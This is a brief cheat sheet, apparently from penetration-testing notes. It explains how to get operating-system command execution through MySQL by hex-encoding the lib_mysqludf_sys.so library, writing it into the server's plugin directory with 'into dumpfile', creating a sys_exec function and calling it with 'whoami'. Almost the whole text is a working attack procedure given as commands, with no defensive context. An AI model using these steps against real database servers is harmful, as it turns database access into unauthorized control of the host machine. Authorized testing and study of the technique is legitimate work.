mysql sys_exec UDF
==================

Make hexa

         xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex

Manual
======

        # copy clipboard hex values
        cat lib_mysqludf_sys.so.hex | xclip -selection c
        # set vars with hex values
        set @shell =  0x${lib_mysqludf_sys.so.hex};
        # retrieve plugin dir path
        select @@plugin_dir;
        select binary @shell into dumpfile '${plugin_di_path}/udf_sys_exec.so';
        create function sys_exec returns int soname 'udf_sys_exec.so';
        select * from mysql.func where name='sys_exec';
        select sys_exec('whoami');

